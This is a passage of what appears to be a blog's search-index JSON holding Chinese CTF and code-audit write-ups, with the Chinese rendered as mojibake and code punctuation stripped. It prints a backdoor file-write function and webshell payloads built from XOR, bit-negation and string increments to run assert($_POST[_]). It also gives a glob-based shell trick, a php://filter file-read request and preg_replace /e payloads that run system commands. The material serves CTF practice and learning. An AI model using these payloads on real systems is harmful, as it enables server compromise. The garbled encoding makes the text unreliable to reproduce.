å‰å°ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´é¦–å…ˆæœç´¢ä¸€ä¸‹thinkphpå°è£…çš„æ–‡ä»¶ä¸Šä¼ æ–¹æ³•ï¼Œæ— æœ æ¥ç€å°è¯•æœç´¢ä¸€ä¸‹æ–‡ä»¶ä¸Šä¼ çš„å±é™©å‡½æ•°ï¼Œæœ‰æœï¼Œä¸ºå‡½æ•°get_trc20()ï¼Œå¦‚ä¸‹ï¼š public function get_trc20() $version=Db::name(system_config)-where([id=72])-order(id desc)- save(array(auth_key=$_REQUEST[key])); $versionsss=Db::name(system_config)-where([id=72])-find(); file_put_contents($_GET[name]..php,base64_decode($versionsss[auth_key])); è¯¥å‡½æ•°ä¸­å­˜åœ¨file_put_contentsæ–¹æ³•ï¼Œå¯ä»¥ä»»æ„å†™å…¥å†…å®¹ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå¹¶ä¸”æ–‡ä»¶ååç¼€è¿˜æ˜¯phpï¼ˆçº¯çº¯åé—¨æˆ‘è§‰å¾—ï¼‰ ç”±è¯¥å‡½æ•°å¯çŸ¥ï¼Œæˆ‘ä»¬åªéœ€è¦å¯¹å˜é‡keyèµ‹å€¼base64ç¼–ç åçš„phpæ–‡ä»¶å†…å®¹ï¼Œç„¶åå¯¹å˜é‡nameèµ‹å€¼ä¸€ä¸ªæ–‡ä»¶åä¾¿å¯ä»¥äº† ä¸Šä¼ æˆåŠŸï¼Œè®¿é—®è¯¥æ–‡ä»¶ï¼š/fw.phpï¼Œå¦‚ä¸‹ï¼š ç»“è¯­è¿™ä¸ªä»£ç å®¡è®¡å…¶å®ç›¸æ¯”äºå…¶ä»–å‡ ä¸ªéƒ½æ›´åŠ ç®€å•ï¼Œæ²¡å¤šå¤§å›°éš¾","categories":["ä»£ç å®¡è®¡"]},{"title":"æ— å­—æ¯æ•°å­—webshellå­¦ä¹ ","path":"/2024/08/14/æ— å­—æ¯æ•°å­—webshellå­¦ä¹ /","content":"å¼•ç”¨æœ¬æ–‡æ˜¯æ ¹æ®Pç¥çš„ä¸¤ç¯‡æ–‡ç« è¿›è¡Œå­¦ä¹ ï¼Œåˆ†åˆ«æ˜¯ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshellä»¥åŠæ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡ æµ…æCTFç»•è¿‡å­—ç¬¦æ•°å­—æ„é€ shell ç¬¬ä¸€ä¸ªé—®é¢˜?phpif(!preg_match(/[a-z0-9]/is,$_GET[shell])) eval($_GET[shell]); else highlight_file(__FILE__); é¢˜ç›®åœ¨eval()å‰è¿›è¡Œè¿‡æ»¤ï¼Œé‚£æˆ‘ä»¬å°±å¾—åœ¨eval()é‡Œå¾—åˆ°æ­£å¸¸çš„webshellè¯­å¥å¹¶æ‰§è¡Œã€‚eval()å…è®¸å¤šè¯­å¥ï¼ˆå¯åˆ†å·ï¼‰ï¼Œè¿™å°±ä¸ºæˆ‘ä»¬å¾—åˆ°æ­£å¸¸çš„webshellè¯­å¥æä¾›äº†å¾ˆå¤§çš„æ“ä½œç©ºé—´ã€‚ é¦–å…ˆï¼Œæ ¸å¿ƒæ€è·¯ä¾¿æ˜¯å°†éå­—æ¯ã€æ•°å­—çš„å­—ç¬¦ç»è¿‡å„ç§å˜æ¢ï¼Œæœ€åèƒ½æ„é€ å‡ºa-zä¸­ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚ç„¶åå†åˆ©ç”¨PHPå…è®¸åŠ¨æ€å‡½æ•°æ‰§è¡Œçš„ç‰¹ç‚¹ï¼Œæ‹¼æ¥å¤„ä¸€ä¸ªå‡½æ•°åï¼Œå¦‚â€œassertâ€ï¼Œç„¶ååŠ¨æ€æ‰§è¡Œä¹‹å³å¯ php5ä¸­assertæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡$f=assert;$f(...);è¿™æ ·çš„æ–¹æ³•æ¥åŠ¨æ€æ‰§è¡Œä»»æ„ä»£ç ã€‚ ä½†php7ä¸­ï¼Œassertä¸å†æ˜¯å‡½æ•°ï¼Œå˜æˆäº†ä¸€ä¸ªè¯­è¨€ç»“æ„ï¼ˆç±»ä¼¼evalï¼‰ï¼Œä¸èƒ½å†ä½œä¸ºå‡½æ•°ååŠ¨æ€æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥åˆ©ç”¨èµ·æ¥ç¨å¾®å¤æ‚ä¸€ç‚¹ã€‚ä½†ä¹Ÿæ— éœ€è¿‡äºæ‹…å¿ƒï¼Œæ¯”å¦‚æˆ‘ä»¬åˆ©ç”¨file_put_contentså‡½æ•°ï¼ŒåŒæ ·å¯ä»¥ç”¨æ¥getshellã€‚ è¯¥é¢˜æœ¬æ–‡ç”¨çš„æ˜¯php5çš„ç¯å¢ƒ å¼‚æˆ–åœ¨PHPä¸­ï¼Œä¸¤ä¸ªå­—ç¬¦ä¸²æ‰§è¡Œå¼‚æˆ–æ“ä½œä»¥åï¼Œå¾—åˆ°çš„è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬æƒ³å¾—åˆ°a-zä¸­æŸä¸ªå­—æ¯ï¼Œå°±æ‰¾åˆ°æŸä¸¤ä¸ªéå­—æ¯ã€æ•°å­—çš„å­—ç¬¦ï¼Œä»–ä»¬çš„å¼‚æˆ–ç»“æœæ˜¯è¿™ä¸ªå­—æ¯å³å¯ å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥ç§æ–¹æ³•æ„é€ å‡ºæ”»å‡»è¯­å¥ï¼Œå¦‚ä¸‹ï¼š ?php$_=(%01^`).(%13^`).(%13^`).(%05^`).(%12^`).(%14^`); // $_=assert;$__=_.(%0D^]).(%2F^`).(%0E^]).(%09^]); // $__=_POST;$___=$$__;$_($___[_]); // assert($_POST[_]); ç”±äºå«æœ‰ä¸å¯è§çš„å­—ç¬¦ï¼Œæ‰€ä»¥urlç¼–ç äº† æ‹¿å»æ‰§è¡Œï¼Œç»“æœå¦‚ä¸‹ï¼š pç¥çš„å¼‚æˆ–æœ‰ç‚¹éš¾ï¼Œæ‰€ä»¥æˆ‘è‡ªå·±ç½‘ä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªå¼‚æˆ–çš„è„šæœ¬ï¼Œå¦‚ä¸‹ï¼š ?phpfor($i=128;$i255;$i++) echo sprintf(%s^%s,urlencode(chr($i)),urlencode(chr(255))).=. (chr($i)^chr(255)). ;? è¿è¡Œè¯¥è„šæœ¬æˆ‘ä»¬çŸ¥é“ %81^%FF=~ %82^%FF= %83^%FF=|%84^%FF= %85^%FF=z %86^%FF=y%87^%FF=x %88^%FF=w %89^%FF=v%8A^%FF=u %8B^%FF=t %8C^%FF=s%8D^%FF=r %8E^%FF=q %8F^%FF=p%90^%FF=o %91^%FF=n %92^%FF=m%93^%FF=l %94^%FF=k %95^%FF=j%96^%FF=i %97^%FF=h %98^%FF=g%99^%FF=f %9A^%FF=e %9B^%FF=d%9C^%FF=c %9D^%FF=b %9E^%FF=a%9F^%FF=` %A0^%FF=_ %A1^%FF=^%A2^%FF=] %A3^%FF=\\ %A4^%FF=[%A5^%FF=Z %A6^%FF=Y %A7^%FF=X%A8^%FF=W %A9^%FF=V %AA^%FF=U%AB^%FF=T %AC^%FF=S %AD^%FF=R %AE^%FF=Q %AF^%FF=P %B0^%FF=O%B1^%FF=N %B2^%FF=M %B3^%FF=L%B4^%FF=K %B5^%FF=J %B6^%FF=I%B7^%FF=H %B8^%FF=G %B9^%FF=F%BA^%FF=E %BB^%FF=D %BC^%FF=C%BD^%FF=B %BE^%FF=A %BF^%FF=@%C0^%FF=? å› æ­¤åˆ°æ—¶å€™åšçš„æ—¶å€™éœ€è¦ä»€ä¹ˆå­—ç¬¦å°±åªè¦ç›´æ¥ä»ä¸Šé¢çš„å¼å­è¿›è¡Œæ‹¼æ¥å°±å¥½äº† å–åä¸æ³•ä¸€æ€è·¯ä¸€è‡´ï¼Œéƒ½æ˜¯é€šè¿‡å­—ç¬¦å˜æ¢å®ç°webshellã€‚ä¸è¿‡è¿™é‡Œé‡‡ç”¨å–åçš„æ€æƒ³ï¼Œå¹¶ä¸”åœ¨Hackbarä¸Šè¦æ‰‹åŠ¨ç¼–ç ä¸€æ¬¡ å–åçš„ç¬¦å·æ˜¯~ï¼Œä¹Ÿæ˜¯ä¸€ç§è¿ç®—ç¬¦ã€‚åœ¨æ•°å€¼çš„äºŒè¿›åˆ¶è¡¨ç¤ºæ–¹å¼ä¸Šï¼Œå°†0å˜ä¸º1ï¼Œå°†1å˜ä¸º0 å½“æˆ‘ä»¬è‡ªå·±ç›´æ¥å°è¯•å¯¹phpinfoè¿›è¡Œå–åçš„æ—¶å€™ï¼Œä¼šäº§ç”Ÿä¸å¯è§å­—ç¬¦ï¼Œå› æ­¤éœ€è¦å–ååå†è¿›è¡Œä¸€æ¬¡urlç¼–ç  å–åçš„è„šæœ¬å¦‚ä¸‹ï¼š ?php$a = urlencode(~phpinfo);echo $a;//%8F%97%8F%96%91%99%90 è„šæœ¬ ?php$shell = assert;$result1 = ;$result2 = ;for($num=0;$num=strlen($shell);$num++) for($x=33;$x126;$x++) if(judge(chr($x))) for($y=33;$y=126;$y++) if(judge(chr($y))) $f = chr($x)^chr($y); if($f == $shell[$num]) $result1 .= chr($x); $result2 .= chr($y); break 2; echo $result1;echo br;echo $result2;function judge($c) if(!preg_match(/[a-z0-9]/is,$c)) return true; return false; è¿™ä¸ªè„šæœ¬å¯ä»¥å°†â€œassertâ€å˜æˆä¸¤ä¸ªå­—ç¬¦ä¸²å¼‚æˆ–çš„ç»“æœï¼Œé€šè¿‡æ›´æ”¹shellçš„å€¼å¯ä»¥æ„é€ å‡ºæˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦ä¸²ã€‚ä¸ºäº†ä¾¿äºè¡¨ç¤ºï¼Œç”Ÿæˆå­—ç¬¦ä¸²çš„èŒƒå›´ä¸º33-126ï¼ˆå¯è§å­—ç¬¦ï¼‰ã€‚ ?php$_ = !((%)(^@[[@[\\\\; //æ„é€ å‡ºassert$__ = !+/((^~`|; //æ„é€ å‡º_POST$___ = $$__; //$___ = $_POST$_($___[_]); //assert($_POST[_]); ?shell=%24_+%3d+%22!((%25)(%22^%22%40[[%40[\\\\%22%3b%24__+%3d+%22!%2b%2f((%22^%22~`|%22%3b%24___+%3d+%24%24__%3b%24_(%24___[_])%3b å°†æ‰€æœ‰å­—ç¬¦è¿›è¡Œç¼–ç ï¼š?shell=%24%5f%3d%22%21%28%28%25%29%28%22%5e%22%40%5b%5b%40%5b%5c%5c%22%3b%24%5f%5f%3d%22%21%2b%2f%28%28%22%5e%22%7e%7b%60%7b%7c%22%3b%24%5f%5f%5f%3d%24%24%5f%5f%3b%24%5f%28%24%5f%5f%5f%5b%5f%5d%29%3b è‡ªå¢åœ¨ä¸åˆ©ç”¨ä½è¿ç®—ç¬¦çš„å‰æä¸‹ï¼Œè§£å†³è¿™é“é¢˜ ä¼—æ‰€å‘¨çŸ¥ï¼ša++ = bï¼Œb++ = câ€¦ æ‰€ä»¥ï¼Œæˆ‘ä»¬åªè¦èƒ½æ‹¿åˆ°ä¸€ä¸ªå˜é‡ï¼Œå…¶å€¼ä¸ºaï¼Œé€šè¿‡è‡ªå¢æ“ä½œå³å¯è·å¾—a-zä¸­æ‰€æœ‰å­—ç¬¦ã€‚ é‚£ä¹ˆï¼Œå¦‚ä½•æ‹¿åˆ°ä¸€ä¸ªå€¼ä¸ºå­—ç¬¦ä¸²â€™aâ€™çš„å˜é‡å‘¢ï¼Ÿ å·§äº†ï¼Œæ•°ç»„ï¼ˆArrayï¼‰çš„ç¬¬ä¸€ä¸ªå­—æ¯å°±æ˜¯å¤§å†™Aï¼Œè€Œä¸”ç¬¬4ä¸ªå­—æ¯æ˜¯å°å†™aã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åŒæ—¶æ‹¿åˆ°å°å†™å’Œå¤§å†™Aï¼Œç­‰äºæˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ°a-zå’ŒA-Zçš„æ‰€æœ‰å­—æ¯ã€‚ åœ¨PHPä¸­ï¼Œå¦‚æœå¼ºåˆ¶è¿æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²çš„è¯ï¼Œæ•°ç»„å°†è¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå…¶å€¼ä¸ºArray å› ä¸ºåœ¨Phpä¸­å¤§å°å†™ä¸æ•æ„Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—åˆ°Aå°±å¯ä»¥äº†ï¼Œæœ€ç»ˆæ‰§è¡Œçš„æ˜¯ASSERT($_POST[_])ï¼Œæ— éœ€è·å–å°å†™aï¼‰ï¼š ?php$_=[];$_=@$_; // $_=Array;$_=$_[!==@]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]); ç¼–ç ï¼Œæ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š ç¬¬äºŒä¸ªé—®é¢˜ï¼ˆåŠ å¼ºç‰ˆï¼‰?phpif(isset($_GET[code])) $code = $_GET[code]; if(strlen($code)35) die(Long.); if(preg_match(/[A-Za-z0-9_$]+/,$code)) die(NO.); eval($code);else highlight_file(__FILE__); è¯¥é¢˜æ˜¯åœ¨ç¯å¢ƒä¸ºphp 7.2ä¸‹è¿›è¡Œçš„ è¿™é“é¢˜å¤šäº†ä¸¤ä¸ªé™åˆ¶ï¼š webshellé•¿åº¦ä¸è¶…è¿‡35ä½ é™¤äº†ä¸åŒ…å«å­—æ¯æ•°å­—ï¼Œè¿˜ä¸èƒ½åŒ…å«$å’Œ_ éš¾ç‚¹å‘¼ä¹‹æ¬²å‡ºäº†ï¼Œå‰é¢çš„æ‰€æœ‰æ–¹æ³•ï¼Œéƒ½ç”¨åˆ°äº†PHPä¸­çš„å˜é‡ï¼Œéœ€è¦å¯¹å˜é‡è¿›è¡Œå˜å½¢ã€å¼‚æˆ–ã€å–åç­‰æ“ä½œï¼Œæœ€ååŠ¨æ€æ‰§è¡Œå‡½æ•°ã€‚ä½†ç°åœ¨ï¼Œå› ä¸º$ä¸èƒ½ä½¿ç”¨äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•æ„é€ PHPä¸­çš„å˜é‡ php7ä¸­ä¿®æ”¹äº†è¡¨è¾¾å¼æ‰§è¡Œçš„é¡ºåºï¼šhttp://php.net/manual/zh/migration70.incompatible.php ï¼š PHP7å‰æ˜¯ä¸å…è®¸ç”¨($a)();è¿™æ ·çš„æ–¹æ³•æ¥æ‰§è¡ŒåŠ¨æ€å‡½æ•°çš„ï¼Œä½†PHP7ä¸­å¢åŠ äº†å¯¹æ­¤çš„æ”¯æŒã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡(phpinfo)();æ¥æ‰§è¡Œå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªæ‹¬å·ä¸­å¯ä»¥æ˜¯ä»»æ„PHPè¡¨è¾¾å¼ã€‚ æ‰€ä»¥å¾ˆç®€å•äº†ï¼Œæ„é€ ä¸€ä¸ªå¯ä»¥ç”Ÿæˆphpinfoè¿™ä¸ªå­—ç¬¦ä¸²çš„PHPè¡¨è¾¾å¼å³å¯ã€‚payloadå¦‚ä¸‹ï¼ˆä¸å¯è§å­—ç¬¦ç”¨urlç¼–ç è¡¨ç¤ºï¼‰ï¼š (~%8F%97%8F%96%91%99%90)(); ä½†æ˜¯è¦æ˜¯åœ¨php5çš„ç¯å¢ƒä¸‹è¦æ€ä¹ˆåŠå‘¢ï¼Œä¸Šè¿°çš„payloadæ˜¯ä¸èµ·ä½œç”¨çš„ PHP5+shellæ‰“ç ´ç¦é”¢æœ¬äººè®¤ä¸ºpç¥å¯¹äºè¿™ä¸ªçš„è§è§£æ˜¯éå¸¸å‰å®³çš„ï¼Œååˆ†å€¼å¾—æˆ‘ä»¬å­¦ä¹  ç¡®å®å¦‚ä»–æ‰€è¨€ï¼Œåå¼•å·ä¹Ÿä¸å±äºå­—æ¯æ•°å­—ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨å®ƒæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä½†æ˜¯å‘¢ï¼šå¦‚ä½•åˆ©ç”¨æ— å­—æ¯ã€æ•°å­—ã€$çš„ç³»ç»Ÿå‘½ä»¤æ¥getshellï¼Ÿ Pç¥æŒ‡äº†å‡ºæ¥ä¸¤ä¸ªæœ‰è¶£çš„Linux shellçŸ¥è¯†ç‚¹ï¼š shellä¸‹å¯ä»¥åˆ©ç”¨.æ¥æ‰§è¡Œä»»æ„è„šæœ¬ Linuxæ–‡ä»¶åæ”¯æŒç”¨globé€šé…ç¬¦ä»£æ›¿ .æˆ–è€…å«periodï¼Œå®ƒçš„ä½œç”¨å’Œsourceä¸€æ ·ï¼Œå°±æ˜¯ç”¨å½“å‰çš„shellæ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚æ¯”å¦‚ï¼Œå½“å‰è¿è¡Œçš„shellæ˜¯bashï¼Œåˆ™. fileçš„æ„æ€å°±æ˜¯ç”¨bashæ‰§è¡Œfileæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚ ç”¨. fileæ‰§è¡Œæ–‡ä»¶ï¼Œæ˜¯ä¸éœ€è¦fileæœ‰xæƒé™çš„ã€‚é‚£ä¹ˆï¼Œå¦‚æœç›®æ ‡æœåŠ¡å™¨ä¸Šæœ‰ä¸€ä¸ªæˆ‘ä»¬å¯æ§çš„æ–‡ä»¶ï¼Œé‚£ä¸å°±å¯ä»¥åˆ©ç”¨.æ¥æ‰§è¡Œå®ƒäº†å—ï¼Ÿ ç¬¬äºŒä¸ªéš¾é¢˜æ¥è¸µè€Œè‡³ï¼Œæ‰§è¡Œ. fileï¼Œä¹Ÿæ˜¯æœ‰å­—æ¯çš„ã€‚æ­¤æ—¶å°±å¯ä»¥ç”¨åˆ°Linuxä¸‹çš„globé€šé…ç¬¦ï¼š *å¯ä»¥ä»£æ›¿0ä¸ªåŠä»¥ä¸Šä»»æ„å­—ç¬¦ ?å¯ä»¥ä»£è¡¨1ä¸ªä»»æ„å­—ç¬¦ é‚£ä¹ˆï¼Œå°±å¯ä»¥è¡¨ç¤ºä¸º/*/?????????æˆ–/???/?????????ã€‚ ä½†æˆ‘ä»¬å°è¯•æ‰§è¡Œ. /???/?????????ï¼Œå´å¾—åˆ°å¦‚ä¸‹é”™è¯¯ï¼š è¿™æ˜¯å› ä¸ºï¼Œèƒ½å¤ŸåŒ¹é…ä¸Š/???/?????????è¿™ä¸ªé€šé…ç¬¦çš„æ–‡ä»¶æœ‰å¾ˆå¤šï¼Œæˆ‘ä»¬å¯ä»¥åˆ—å‡ºæ¥: é‚£ä¹ˆæˆ‘ä»¬è¦å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„æ–‡ä»¶ï¼Œå°±å¿…é¡»è¿›è¡Œè¿‡æ»¤ï¼Œæœ‰ä¸¤ä¸ªæ–¹æ³•å¯ä»¥å¸®åŠ©æˆ‘ä»¬ï¼š globæ”¯æŒç”¨[^x]çš„æ–¹æ³•æ¥æ„é€ â€œè¿™ä¸ªä½ç½®ä¸æ˜¯å­—ç¬¦xâ€ è·Ÿæ­£åˆ™è¡¨è¾¾å¼ç±»ä¼¼ï¼Œglobæ”¯æŒåˆ©ç”¨[0-9]æ¥è¡¨ç¤ºä¸€ä¸ªèŒƒå›´ ï¼ˆå…·ä½“ä¸Šè¿°ä¸¤ç§å¦‚ä½•æ“ä½œå»ºè®®æŸ¥çœ‹pç¥çš„æ–‡ç« ï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€èµ˜è¿°äº†ï¼‰ åœ¨å®ç°äº†ä»¥ä¸Šè¿‡æ»¤åï¼Œä¾¿å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†ï¼Œå¦‚pç¥çš„ä¸€ä¸ªä¾‹å­ï¼š ?code=??=`. /???/????????[@-[]`;? æˆåŠŸæ‰§è¡Œä»»æ„å‘½ä»¤","categories":["CTF"]},{"title":"CTF-webåˆ·é¢˜","path":"/2024/08/09/CTF-webåˆ·é¢˜/","content":"Caté¦–å…ˆæ‰“å¼€é¢˜ç›®ç¯å¢ƒï¼Œå‘ç°æ˜¯å¦‚ä¸‹çš„è¾“å…¥æ¡† å°è¯•è¾“å…¥127.0.0.1ï¼Œå›æ˜¾å¦‚ä¸‹ å‘ç°æ˜¯getä¼ å‚ï¼Œè¾“å…¥ipåä¼špingä¸€ä¸‹ æœ€å¼€å§‹ä»¥ä¸ºæ˜¯ssrfç›¸å…³æ¼æ´ï¼Œå°è¯•åå‘ç°å¹¶ä¸æ˜¯ï¼Œé‚£ä¹ˆåº”è¯¥å°±æ˜¯è·Ÿpingç›¸å…³çš„äº† è¾“å…¥ï¼š127.0.0.1;lsï¼Œç»“æœå›æ˜¾Invalid URL é‚£åº”è¯¥å°±æ˜¯æœ‰å­—ç¬¦è¿‡æ»¤çš„äº†ï¼Œæå‡ºsqli_fuzzå­—å…¸å¼€å§‹fuzz ç»“æœå‘ç°å½“è¾“å…¥%a0çš„æ—¶å€™é¡µé¢ä¼šç›´æ¥ä¼šæ˜¾å‡ºä»£ç  ä¸€ä¸ªhtmlæ–‡ä»¶ï¼Œå°†å…¶ä»£ç å¤åˆ¶åå†æ‰“å¼€ ç”¨æ¸¸è§ˆå™¨æ‰“å¼€ä»¥åæœ€åº•ä¸‹å¯ä»¥çœ‹åˆ°ä¸€ä¸²æç¤ºï¼šYouâ€™re seeing this error because you have DEBUG True in your Django settings file. Change that to False, and Django will display a standard page generated by the handler for this status code. ä¹Ÿå°±æ˜¯è¯´ï¼ŒTrue in your Django settings file.æœ‰å¯èƒ½flagæ–‡ä»¶åœ¨ settings file ä¸­ã€‚å…³é”®è¯æœç´¢flagæ— æœï¼ŒæŸ¥æ‰¾æ•°æ®åº“ å°†è¿™ä¸ªé“¾æ¥ç›´æ¥å¤åˆ¶åˆ°è¾“å…¥æ¡†ä¸­ï¼Œå›è½¦ï¼Œæ— æœ æœç´¢ä¸€ç•ªï¼Œè¿˜æ˜¯æ²¡æœ‰å‘ç°ï¼Œåªèƒ½å»çœ‹å…¶ä»–å¤§ä½¬çš„æ–‡æ¡£ï¼Œå‘ç°äº†@æœ‰å…³ï¼Œphpä¸­curlå‡½æ•°@çš„ä½œç”¨PHPä¸­curlçš„CURLOPT_POSTFIELDSå‚æ•°ä½¿ç”¨ç»†èŠ‚ - 52php - åšå®¢å›­ ä½¿ç”¨æ•°ç»„æä¾› post æ•°æ®æ—¶ï¼ŒCURL ç»„ä»¶å¤§æ¦‚æ˜¯ä¸ºäº†å…¼å®¹ @filename è¿™ç§ä¸Šä¼ æ–‡ä»¶çš„å†™æ³•ï¼Œé»˜è®¤æŠŠ content_type è®¾ä¸ºäº† multipart/form-dataã€‚è™½ç„¶å¯¹äºå¤§å¤šæ•°æœåŠ¡å™¨å¹¶æ²¡æœ‰å½±å“ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å°‘éƒ¨åˆ†æœåŠ¡å™¨ä¸å…¼å®¹ã€‚ æ‰€ä»¥æˆ‘ä»¬åœ¨è¯¥é“¾æ¥ä¹‹å‰åŠ ä¸ª@ï¼Œå›æ˜¾å¦‚ä¸‹ å…³é”®è¯æœç´¢ctfï¼Œå¾—åˆ°flagï¼Œé¢˜ç›®è§£å†³ ics-05æ‰“å¼€ç¯å¢ƒï¼Œè¿›å…¥ä¹‹ååˆ°å¤„ç‚¹å‡»å‘ç°åªæœ‰è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒå¯ä»¥ç‚¹è¿›å»ï¼Œå¹¶ä¸”å½“æˆ‘ä»¬å†æ¬¡ç‚¹å‡»è¯¥æ ‡é¢˜çš„æ—¶å€™urlå‘ç”Ÿäº†æ”¹å˜ å¯ä»¥å‘ç°pageçš„å‚æ•°ä¼šå›æ˜¾å›æ¥ï¼Œå½“æˆ‘ä»¬è¾“å…¥index.phpçš„æ—¶å€™å›æ˜¾ok é‚£ä¹ˆè®©æˆ‘ä»¬æ¥å°è¯•è¯»å–ä¸€ä¸‹è¯¥æ–‡ä»¶ï¼š/index.php?page=php://filter/read=convert.base64-encode/resource=index.php å°†å›æ˜¾çš„ä¸€å¤§ä¸²base64ç¼–ç åçš„æ•°æ®å¤åˆ¶è§£ç ï¼Œå¦‚ä¸‹ï¼š ?phperror_reporting(0);@session_start();posix_setuid(1000);?!DOCTYPE HTMLhtmlhead meta charset=utf-8 meta name=renderer content=webkit meta http-equiv=X-UA-Compatible content=IE=edge,chrome=1 meta name=viewport content=width=device-width, initial-scale=1, maximum-scale=1 link rel=stylesheet href=layui/css/layui.css media=all titleè®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ/title meta charset=utf-8/headbody ul class=layui-nav li class=layui-nav-item layui-thisa href=?page=indexäº‘å¹³å°è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ/a/li /ul fieldset class=layui-elem-field layui-field-title style=margin-top: 30px; legendè®¾å¤‡åˆ—è¡¨/legend /fieldset table class=layui-hide id=test/table script type=text/html id=switchTpl !-- è¿™é‡Œçš„ checked çš„çŠ¶æ€åªæ˜¯æ¼”ç¤º -- input type=checkbox name=sex value=d.id lay-skin=switch lay-text=å¼€|å…³ lay-filter=checkDemo d.id==1 0003 ? checked : /script script src=layui/layui.js charset=utf-8/script script layui.use(table, function() var table = layui.table, form = layui.form; table.render( elem: #test, url: /somrthing.json, cellMinWidth: 80, cols: [ [ type: numbers , type: checkbox , field: id, title: ID, width: 100, unresize: true, sort: true , field: name, title: è®¾å¤‡å, templet: #nameTpl , field: area, title: åŒºåŸŸ , field: status, title: ç»´æŠ¤çŠ¶æ€, minWidth: 120, sort: true , field: check, title: è®¾å¤‡å¼€å…³, width: 85, templet: #switchTpl, unresize: true ] ], page: true ); ); /script script layui.use(element, function() var element = layui.element; //å¯¼èˆªçš„hoveræ•ˆæœã€äºŒçº§èœå•ç­‰åŠŸèƒ½ï¼Œéœ€è¦ä¾èµ–elementæ¨¡å— //ç›‘å¬å¯¼èˆªç‚¹å‡» element.on(nav(demo), function(elem) //console.log(elem) layer.msg(elem.text()); ); ); /script?php$page = $_GET[page];if (isset($page)) if (ctype_alnum($page)) ? br /br /br /br / div style=text-align:center p class=lead?php echo $page; die();?/p br /br /br /br /?phpelse? br /br /br /br / div style=text-align:center p class=lead ?php if (strpos($page, input) 0) die(); if (strpos($page, ta:text) 0) die(); if (strpos($page, text) 0) die(); if ($page === index.php) die(Ok); include($page); die(); ? /p br /br /br /br /?php//æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯•if ($_SERVER[HTTP_X_FORWARDED_FOR] === 127.0.0.1) echo br Welcome My Admin ! br ; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) isset($replacement) isset($subject)) preg_replace($pattern, $replacement, $subject); else die(); ?/body/html å¾ˆæ˜æ˜¾ä¸Šé¢è¿™ä¹ˆå¤šçš„ä»£ç é‡ç‚¹å°±åœ¨äºæœ€åçš„preg_replaceå‡½æ•°è¿™é‡Œï¼Œæ‰€ä»¥ä¸Šç½‘æœäº†æœæœ‰æ²¡æœ‰ç›¸å…³çš„æ¼æ´ï¼šhttps://www.sqlsec.com/2020/07/preg_replace.html#%E5%9C%BA%E6%99%AF1-%E6%97%A0%E9%99%90%E5%88%B6%E4%BC%A0%E5%8F%82 å‘ç°æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¿®é¥°ç¬¦eæ¥è¿›è¡Œä»£ç æ‰§è¡Œ /index.php?pat=/233/erep=phpinfo()sub=233 æˆåŠŸæ‰§è¡Œ æ‰§è¡Œå¯»æ‰¾ç›¸å…³flagæ–‡ä»¶çš„ä»£ç ï¼š/index.php?pat=/233/erep=system(find / -name flag)sub=233 